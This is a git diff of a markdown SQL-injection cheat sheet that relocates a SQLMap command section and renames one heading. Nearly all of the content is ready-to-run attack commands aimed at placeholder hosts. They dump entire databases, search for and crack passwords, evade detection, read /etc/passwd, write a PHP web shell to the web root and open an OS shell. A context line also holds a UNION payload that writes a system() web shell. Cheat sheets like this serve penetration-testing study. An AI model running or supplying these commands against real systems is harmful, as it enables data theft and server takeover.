@@ -65,6 +65,113 @@ SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;                 -- MySQL / 
 ```
 
 ---
+## SQLMap
+
+```bash
+sqlmap -hh
+
+# Advanced tuning
+--code=200 # HTTP Status code 200 = TRUE
+--titles 'Admin Panel' # Webpage title
+--string=success # Successful strings
+--text-only # Removes all HTML tags and compares based on the textual content
+--technique=BEU # specifu SQLi technique
+The technique characters `BEUSTQ` refers to the following:
+- `B`: Boolean-based blind
+- `E`: Error-based
+- `U`: Union query-based
+- `S`: Stacked queries
+- `T`: Time-based blind
+- `Q`: Inline queries
+--union-cols=17 --union-char='a' --union-from=users # Specify to assist in UNION query-based SQLi
+
+# Run SQLMap without asking for user input. Use `--dump` to dump ALL data!
+sqlmap -u "http://www.example.com/vuln.php?id=1" --batch --dump
+
+# In webpage, copy GET request as cURL > paste and replace `curl` with `sqlmap` > use `--crawl`, `--forms`, `-g` for specilized options
+sqlmap 'http://www.example.com/?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0' -H 'Accept: image/webp,*/*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'DNT: 1' --crawl --forms -g
+
+# SQLMap with POST request specifying an injection point with asterisk
+sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'
+
+# Passing an HTTP request file to SQLMap. Can specify injection point within the txt file with asterisk (e.g. `/?id=*`). Can use sqlmap with APIs as sqlmap can read JSON as well!
+sqlmap -r req.txt
+
+# Specifying a Cookie Header
+sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
+sqlmap ... -H='Cookie:PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
+
+# Use `--random-agent` and/or `--mobile` to evade detection.
+sqlmap -r req.txt --batch --dump --random-agent
+sqlmap -r req.txt --batch --dump --mobile
+
+# Specifying a PUT request
+sqlmap -u www.target.com --data='id=1' --method PUT
+
+# Force sqlmap to use `OR` payloads with `--risk=3`. Helps determine the prefix to use.
+sqlmap -r req.txt --batch --dump --risk=3
+
+# Force sqlmap to test more boundaries `--level=5`. Also helps determine the prefix to use.
+sqlmap -r req.txt --level=5 -v 3
+sqlmap -r req.txt --level=5 --string="Welcome" -v 3 # Check webpage for successful string!
+
+# Specifying a prefix or suffix. Test different payloads wotfor correct prefix
+sqlmap -u "www.example.com/?q=test" --prefix='%'))' --suffix='-- -'         '# May need single/double quotes for prefix/suffix...
+
+# Basic DB enumeration
+sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba --hostname
+
+# Table enumeration
+sqlmap -u "http://www.example.com/?id=1" --tables -D testdb
+
+# Dump all, exlcuding sysdbs
+sqlmap -u "http://www.example.com/?id=1" --dump --exclude-sysdbs
+sqlmap -u "http://www.example.com/?id=1" --dump-all --exclude-sysdbs
+
+# Table row enumeration
+sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname
+
+# Conditional enumeration
+sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"
+
+# Database Schema Enumeration
+sqlmap -u "http://www.example.com/?id=1" --schema
+
+# Search the Database (`-T` table, `-C` columns)
+sqlmap -u "http://www.example.com/?id=1" --search -T user -v 3
+sqlmap -u "http://www.example.com/?id=1" --search -C pass -v 3
+
+# Password Enumeration and Cracking
+sqlmap -u "http://www.example.com/?id=1" --dump -D master -T users
+sqlmap -u "http://www.example.com/?id=1" --passwords --batch --all
+sqlmap -r req.txt --batch --search -C pass -v 3
+
+# Bypass WAF w/ Anti-CSRF token bypass
+sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"
+
+# List all tamper scripts
+sqlmap --list-tampers
+
+# Check for DBA Privileges
+sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba
+
+# Read File
+sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"
+
+# Writing a file
+sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
+
+# Spawn a shell
+sqlmap -u "http://www.example.com/?id=1" --os-shell
+
+# Debug errors
+sqlmap -r req.txt --batch --dump --parse-errors -t /tmp/traffic.txt -v 6
+
+# Debug errors with proxy
+sqlmap -r req.txt --batch --dump --parse-errors -t /tmp/traffic.txt -v 6 --proxy
+```
+
+---
 ## SQLi Payloads
  - [more payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass)
 ### QUICK PAYLOADS
@@ -387,111 +494,6 @@ cn') UNION SELECT "", '<?php system($_REQUEST[0]); ?>',"","" into outfile '/var/
 ```
 
 ---
-## SQLMap
-
-```bash
-sqlmap -hh
-
-# Advanced tuning
---code=200 # HTTP Status code 200 = TRUE
---titles 'Admin Panel' # Webpage title
---string=success # Successful strings
---text-only # Removes all HTML tags and compares based on the textual content
---technique=BEU # specifu SQLi technique
-The technique characters `BEUSTQ` refers to the following:
-- `B`: Boolean-based blind
-- `E`: Error-based
-- `U`: Union query-based
-- `S`: Stacked queries
-- `T`: Time-based blind
-- `Q`: Inline queries
---union-cols=17 --union-char='a' --union-from=users # Specify to assist in UNION query-based SQLi
-
-# Run SQLMap without asking for user input. Use `--dump` to dump ALL data!
-sqlmap -u "http://www.example.com/vuln.php?id=1" --batch --dump
-
-# In webpage, copy GET request as cURL > paste and replace `curl` with `sqlmap` > use `--crawl`, `--forms`, `-g` for specilized options
-sqlmap 'http://www.example.com/?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0' -H 'Accept: image/webp,*/*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'DNT: 1' --crawl --forms -g
-
-# SQLMap with POST request specifying an injection point with asterisk
-sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'
-
-# Passing an HTTP request file to SQLMap. Can specify injection point within the txt file with asterisk (e.g. `/?id=*`). Can use sqlmap with APIs as sqlmap can read JSON as well!
-sqlmap -r req.txt
-
-# Specifying a Cookie Header
-sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
-sqlmap ... -H='Cookie:PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
-
-# Use `--random-agent` and/or `--mobile` to evade detection.
-sqlmap -r req.txt --batch --dump --random-agent
-sqlmap -r req.txt --batch --dump --mobile
-
-# Specifying a PUT request
-sqlmap -u www.target.com --data='id=1' --method PUT
-
-# Force sqlmap to use `OR` payloads with `--risk=3`. Helps determine the prefix to use.
-sqlmap -r req.txt --batch --dump --risk=3
-
-# Force sqlmap to test more boundaries `--level=5`. Also helps determine the prefix to use.
-sqlmap -r req.txt --level=5 -v 3
-sqlmap -r req.txt --level=5 --string="Welcome" -v 3 # Check webpage for successful string!
-
-# Specifying a prefix or suffix. Test different payloads wotfor correct prefix
-sqlmap -u "www.example.com/?q=test" --prefix='%'))' --suffix='-- -'         '# May need single/double quotes for prefix/suffix...
-
-# Basic DB enumeration
-sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba --hostname
-
-# Table enumeration
-sqlmap -u "http://www.example.com/?id=1" --tables -D testdb
-
-# Dump all, exlcuding sysdbs
-sqlmap -u "http://www.example.com/?id=1" --dump --exclude-sysdbs
-sqlmap -u "http://www.example.com/?id=1" --dump-all --exclude-sysdbs
-
-# Table row enumeration
-sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname
-
-# Conditional enumeration
-sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"
-
-# Database Schema Enumeration
-sqlmap -u "http://www.example.com/?id=1" --schema
-
-# Search the Database (`-T` table, `-C` columns)
-sqlmap -u "http://www.example.com/?id=1" --search -T user -v 3
-sqlmap -u "http://www.example.com/?id=1" --search -C pass -v 3
-
-# Password Enumeration and Cracking
-sqlmap -u "http://www.example.com/?id=1" --dump -D master -T users
-sqlmap -u "http://www.example.com/?id=1" --passwords --batch --all
-sqlmap -r req.txt --batch --search -C pass -v 3
-
-# CSRF token bypass
-sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"
-
-# List all tamper scripts
-sqlmap --list-tampers
-
-# Check for DBA Privileges
-sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba
-
-# Read File
-sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"
-
-# Writing a file
-sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
-
-# Spawn a shell
-sqlmap -u "http://www.example.com/?id=1" --os-shell
-
-# Debug errors
-sqlmap -r req.txt --batch --dump --parse-errors -t /tmp/traffic.txt -v 6
-
-# Debug errors with proxy
-sqlmap -r req.txt --batch --dump --parse-errors -t /tmp/traffic.txt -v 6 --proxy
-```
 
 ## SQL Injection (SQLi)
 
